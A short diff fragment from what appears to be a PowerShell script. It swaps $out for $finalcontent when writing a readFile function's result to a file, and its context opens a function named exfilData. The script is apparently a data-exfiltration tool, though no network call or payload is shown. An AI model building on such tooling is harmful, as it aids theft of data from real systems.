@@ -17,7 +17,7 @@ function readFile {
     return $finalcontent
 }
 
-$out > $FileName
+$finalcontent > $FileName
 
 function exfilData {
     [CmdletBinding()]
